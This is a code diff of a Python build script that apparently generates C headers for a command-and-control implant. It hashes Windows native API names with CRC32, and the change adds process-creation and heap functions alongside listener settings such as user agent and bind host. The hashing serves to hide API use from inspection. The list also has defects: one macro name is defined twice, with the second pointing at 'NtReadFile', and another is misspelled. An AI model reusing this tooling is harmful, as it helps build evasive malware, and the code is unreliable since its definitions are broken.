@@ -30,14 +30,20 @@ GENERATED_SEED = int(binascii.crc32(seed_str.encode())) # 0xDEADDEAD
 
 
 plain_function_strings = [
-    "#define RtlRandomEx_CRC32B             \"RtlRandomEx\"",
-    "#define RtlGetVersion_CRC32B           \"RtlGetVersion\"",
-    "#define RtlInitUnicodeString_CRC32B    \"RtlInitUnicodeString\"",
-    "#define NtCreateFile_CRC32b            \"NtCreateFile\"",
-    "#define NtQueryInformationFile_CRC32B  \"NtQueryInformationFile\"",
-    "#define NtAllocateVirtualMemory_CRC32B \"NtAllocateVirtualMemory\"",
-    "#define NtWriteFile_CRC32B             \"NtWriteFile\"",
-    "#define NtWriteFile_CRC32B             \"NtReadFile\""]
+    "#define RtlRandomEx_CRC32B                     \"RtlRandomEx\"",
+    "#define RtlGetVersion_CRC32B                   \"RtlGetVersion\"",
+    "#define RtlInitUnicodeString_CRC32B            \"RtlInitUnicodeString\"",
+    "#define RtlAllocateHeap_CRC32B                 \"RtlAllocateHeap\"",
+    "#define RtlGetProcessHeaps_CRC32B              \"RtlGetProcessHeaps\"",
+    "#define RtlFreeHeap_CRC32B                     \"RtlFreeHeap\"",
+    "#define RtlCreateProcessParametersEx_CBC32B    \"RtlCreateProcessParametersEx\"",
+    "#define RtlDestroyProcessParameters_CRC32B     \"RtlDestroyProcessParameters\"",
+    "#define NtCreateFile_CRC32b                    \"NtCreateFile\"",
+    "#define NtQueryInformationFile_CRC32B          \"NtQueryInformationFile\"",
+    "#define NtAllocateVirtualMemory_CRC32B         \"NtAllocateVirtualMemory\"",
+    "#define NtCreateUserProcess_CRC32B             \"NtCreateUserProcess\"",
+    "#define NtWriteFile_CRC32B                     \"NtWriteFile\"",
+    "#define NtWriteFile_CRC32B                     \"NtReadFile\""]
 
 plain_strings = [
     "#define S_INSTANCE_NOT_CONNECTED \"instance not connected!\"",
@@ -120,6 +126,7 @@ def process_strings_h():
     for filepath in glob.iglob('**/Strings.h', recursive=True):
         with open(filepath, 'w') as f:
             f.write(strings_file)
+
 def process_config_h(config: dict):
     config_user_agent:         str = config['Options']['Listener']['UserAgent']
     config_host_bind:          str = config['Options']['Listener']['HostBind']
